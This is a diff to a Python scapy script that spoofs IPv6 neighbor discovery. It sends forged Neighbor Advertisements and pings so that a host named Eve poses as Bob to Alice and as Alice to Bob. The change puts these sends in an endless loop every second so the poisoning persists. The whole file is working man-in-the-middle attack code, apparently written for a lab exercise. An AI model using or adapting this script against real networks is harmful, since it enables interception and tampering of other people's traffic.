@@ -1,4 +1,5 @@
 from scapy.all import *
+import time
 
 # Eve details
 EVE_IPv6 = "fe80::82b5:2e0c:405:fead"
@@ -11,7 +12,6 @@ ALICE_MAC = "08:00:27:53:f5:cb"
 # Bob details
 BOB_IPv6 = "fe80::1eaa:7821:6306:2979"
 BOB_MAC = "08:00:27:ab:33:74"
-
 
 def build_fake_na(victim_mac, victim_ip, target_ip):
     fake_na = Ether(src=EVE_MAC, dst=victim_mac)
@@ -33,17 +33,18 @@ def build_fake_ping6(victim_mac, victim_ip, target_ip):
     fake_ping6 /= ICMPv6EchoRequest(id=1,seq=1,data='hey')
     return fake_ping6
 
-
 def send_fake_ping6(victim_mac, victim_ip, target_ip):
     fake_ping6 = build_fake_ping6(victim_mac, victim_ip, target_ip)
     fake_ping6.show()
     sendp(fake_ping6)
 
+while True:
+    # ping6&na to alice "from bob"
+    send_fake_ping6(ALICE_MAC, ALICE_IPv6, BOB_IPv6)
+    send_fake_na(ALICE_MAC, ALICE_IPv6, BOB_IPv6)
 
-# ping6&na to alice "from bob"
-send_fake_ping6(ALICE_MAC, ALICE_IPv6, BOB_IPv6)
-send_fake_na(ALICE_MAC, ALICE_IPv6, BOB_IPv6)
-
-# ping&na to bob "from alice"
-send_fake_ping6(BOB_MAC, BOB_IPv6, ALICE_IPv6)
-send_fake_na(BOB_MAC, BOB_IPv6, ALICE_IPv6)
+    # ping&na to bob "from alice"
+    send_fake_ping6(BOB_MAC, BOB_IPv6, ALICE_IPv6)
+    send_fake_na(BOB_MAC, BOB_IPv6, ALICE_IPv6)
+    
+    time.sleep(1)
